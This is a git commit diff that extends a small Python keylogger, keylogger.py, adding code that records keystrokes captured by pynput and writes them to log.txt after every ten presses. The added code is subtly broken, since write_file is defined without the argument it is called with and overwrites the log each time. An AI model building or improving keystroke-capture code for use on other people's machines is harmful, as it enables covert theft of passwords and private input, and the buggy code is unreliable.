cac0d944a12b04ad49a922c60aa843556739a95a
dragan.pecanac <dragan.pecanac.dev@gmail.com>
2022-03-16 13:14:23 -0700

    log file attempt

--- keylogger.py
+++ keylogger.py
@@ -2,8 +2,25 @@ import pynput
 
 from pynput.keyboard import Key, Listener 
 
+count = 0
+keys = []
+
 def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
     print("{0} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file():
+    with open("log.txt", "w") as f:
+        for key in keys:
+            f.write(str(key))
 
 def on_release(key):
     if key == Key.esc:
@@ -11,4 +28,3 @@ def on_release(key):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
